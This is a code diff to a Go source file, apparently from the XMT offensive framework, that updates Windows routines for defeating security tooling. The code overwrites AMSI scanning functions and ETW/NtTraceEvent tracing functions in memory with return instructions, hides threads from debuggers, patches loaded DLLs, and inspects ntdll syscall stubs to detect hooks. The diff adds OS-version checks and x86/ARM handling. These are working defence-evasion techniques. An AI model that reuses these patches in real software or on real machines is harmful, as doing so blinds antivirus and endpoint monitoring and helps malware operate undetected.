@@ -1,4 +1,5 @@
 //go:build windows
+// +build windows
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -23,18 +24,25 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/iDigitalFlame/xmt/device/arch"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 )
 
 // PatchAmsi will attempt to zero out the following function calls with a
 // ASM patch that returns with zero (Primary AMSI/PowerShell calls).
 //
-// - AmsiInitialize
-// - AmsiScanBuffer
-// - AmsiScanString
+//   - AmsiInitialize
+//   - AmsiScanBuffer
+//   - AmsiScanString
 //
 // This will return an error if any of the patches fail.
+//
+// This function returns 'syscall.EINVAL' if ASMI is not avaliable on the target
+// system, which is Windows 10 and newer.
 func PatchAmsi() error {
+	if !IsWindows10() {
+		return syscall.EINVAL
+	}
 	if err := zeroPatch(funcAmsiInitialize); err != nil {
 		return err
 	}
@@ -50,15 +58,18 @@ func PatchAmsi() error {
 // PatchTracing will attempt to zero out the following function calls with a
 // ASM patch that returns with zero:
 //
-// - NtTraceEvent
-// - DebugBreak
-// - DbgBreakPoint
-// - EtwEventWrite
-// - EtwEventRegister
-// - EtwEventWriteFull
-// - EtwNotificationRegister
+//   - NtTraceEvent
+//   - DebugBreak
+//   - DbgBreakPoint
+//   - EtwEventWrite
+//   - EtwEventRegister
+//   - EtwEventWriteFull
+//   - EtwNotificationRegister
 //
 // This will return an error if any of the patches fail.
+//
+// Any system older than Windows Vista will NOT patch ETW functions as they do
+// not exist in older versions.
 func PatchTracing() error {
 	if err := zeroPatch(funcNtTraceEvent); err != nil {
 		return err
@@ -69,6 +80,10 @@ func PatchTracing() error {
 	if err := zeroPatch(funcDbgBreakPoint); err != nil {
 		return err
 	}
+	if !IsWindowsVista() {
+		return nil
+	}
+	// NOTE(dij): These are only supported in Windows Vista and above.
 	if err := zeroPatch(funcEtwEventWrite); err != nil {
 		return err
 	}
@@ -89,7 +104,7 @@ func PatchTracing() error {
 func HideGoThreads() error {
 	return ForEachThread(func(h uintptr) error {
 		// 0x11 - ThreadHideFromDebugger
-		if r, _, _ := syscall.SyscallN(funcNtSetInformationThread.address(), h, 0x11, 0, 0); r > 0 {
+		if r, _, _ := syscallN(funcNtSetInformationThread.address(), h, 0x11, 0, 0); r > 0 {
 			return formatNtError(r)
 		}
 		return nil
@@ -112,7 +127,7 @@ func zeroPatch(p *lazyProc) error {
 	(*(*[1]byte)(unsafe.Pointer(p.addr + 3)))[0] = 0xC3 // RET
 	(*(*[1]byte)(unsafe.Pointer(p.addr + 4)))[0] = 0xC3 // RET
 	_, err = NtProtectVirtualMemory(CurrentProcess, p.addr, 5, o)
-	syscall.SyscallN(funcNtFlushInstructionCache.address(), CurrentProcess, p.addr, 5)
+	syscallN(funcNtFlushInstructionCache.address(), CurrentProcess, p.addr, 5)
 	return err
 }
 
@@ -265,7 +280,6 @@ func PatchDLL(dll string, addr uint32, b []byte) error {
 	if len(b) == 0 {
 		return ErrInsufficientBuffer
 	}
-
 	h, err := loadCachedEntry(dll)
 	if err != nil {
 		return err
@@ -351,17 +365,32 @@ func CheckFunction(dll, name string, b []byte) (bool, error) {
 	// Check for ntdll.dll functions doing syscall prep.
 	// Check the first 4 bytes to see if they match.
 	//
-	//   mov r10, rcx ;(4c 8b d1)
-	//   mov eax, sysid ;(b8 sysid)
+	//   mov r10, rcx     // 4C 8B D1 B8 51 00 00 00
+	//   mov eax, [sysid] // B8 [sysid]
+	//   ^ AMD64 Only
+	//
+	//   x86 calls SYSENTER at 7FFE0300 instead
+	//   mov eax, [sysid]  // B8 [sysid]
+	//   mov edx, 7ffe0300 // BA 00 03 FE 7F
 	//
 	// NOTE(dij): This can cause some false positives on non-syscall functions
 	//            such as ETW or heap management functions.
 	if dllNtdll.addr > 0 && h == dllNtdll.addr {
-		if v := *(*[4]byte)(unsafe.Pointer(p)); v[0] != 0x4C && v[1] != 0x8B && v[2] != 0xD1 && v[3] != 0xB8 {
-			if bugtrack.Enabled {
-				bugtrack.Track("winapi.CheckFunction(): Detected an ntdll function that does not match standard syscall instructions at %X, dll=%s, name=%s!", p, dll, name)
+		switch arch.Current {
+		case arch.ARM, arch.X86:
+			if v := *(*[5]byte)(unsafe.Pointer(p + 5)); (*(*[1]byte)(unsafe.Pointer(p)))[0] != 0xB8 || v[0] != 0xBA || v[1] != 0x00 || v[2] != 0x03 || v[3] != 0xFE || v[4] != 0x7F {
+				if bugtrack.Enabled {
+					bugtrack.Track("winapi.CheckFunction(): Detected an ntdll function that does not match standard syscall instructions at %X, dll=%s, name=%s!", p, dll, name)
+				}
+				return false, nil
 			}
-			return false, nil
+		case arch.ARM64, arch.X64:
+			if v := *(*[5]byte)(unsafe.Pointer(p)); v[0] != 0x4C || v[1] != 0x8B || v[2] != 0xD1 || v[3] != 0xB8 || v[4] != 0x51 {
+				if bugtrack.Enabled {
+					bugtrack.Track("winapi.CheckFunction(): Detected an ntdll function that does not match standard syscall instructions at %X, dll=%s, name=%s!", p, dll, name)
+				}
+				return false, nil
+			}
 		}
 	}
 	return true, nil
